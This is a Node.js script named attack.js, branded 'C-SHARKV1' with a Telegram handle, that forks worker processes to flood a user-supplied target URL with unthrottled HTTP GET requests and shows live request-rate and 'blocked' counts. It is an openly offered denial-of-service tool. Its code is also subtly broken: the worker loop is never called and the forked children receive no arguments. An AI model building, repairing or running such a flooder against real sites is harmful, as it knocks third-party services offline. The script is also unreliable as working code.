const axios = require('axios');
const { fork } = require('child_process');

// Get command line arguments: target URL and duration
const [,, targetUrl, timeInSeconds, numWorkers] = process.argv;

if (!targetUrl || !timeInSeconds || !numWorkers) {
  console.log('Usage: node attack.js <target_url> <time_in_seconds> <num_workers>');
  process.exit(1);
}

// Convert timeInSeconds to a number and ensure it's valid
const durationInMs = parseInt(timeInSeconds, 10) * 1000;
if (isNaN(durationInMs) || durationInMs <= 0) {
  console.log('Please provide a valid time in seconds.');
  process.exit(1);
}

const totalDuration = durationInMs;
let totalRequests = 0;
let successfulRequests = 0;
let blockedRequests = 0;
let peakRps = 0;
let lastRequestsCount = 0;
let startTime = Date.now();
let stopTime = startTime + totalDuration;

const workers = [];

// Function to send HTTP requests
const sendRequest = async () => {
  try {
    const response = await axios.get(targetUrl);
    successfulRequests++;
  } catch (error) {
    blockedRequests++;
  }

  totalRequests++;
};

// Function to display live statistics (overwritten every 100ms)
const displayStats = () => {
  const currentTime = Date.now();
  const elapsedTime = currentTime - startTime;
  const remainingTime = Math.max(stopTime - currentTime, 0);
  
  // Calculate the current requests per second (RPS)
  const rps = totalRequests - lastRequestsCount;
  peakRps = Math.max(peakRps, rps);

  // Prepare output message
  const statsMessage = `
C-SHARKV1 - T.ME/STSVKINGDOM

Total Sent: ${totalRequests}
Max-RPS: ${peakRps}
Success: ${successfulRequests}
Blocked: ${blockedRequests}
Time Remaining: ${Math.ceil(remainingTime / 1000)}s
`;

  // Output stats, overwriting the terminal every 100ms
  process.stdout.write(`\r${statsMessage}`);
  lastRequestsCount = totalRequests;
};

// Worker process that performs flooding
const workerProcess = () => {
  const interval = setInterval(() => {
    if (Date.now() > stopTime) {
      clearInterval(interval);
      return;
    }

    sendRequest();
    displayStats();
  }, 0); // No delay, send requests instantly
};

// Launch multiple workers
for (let i = 0; i < numWorkers; i++) {
  workers.push(fork(__filename));  // Fork the current script to run as a child process
}

// Start the attack
setTimeout(() => {
  workers.forEach(worker => worker.kill());  // Kill workers after the attack duration
  console.log("\nFlood test completed.");
}, totalDuration);
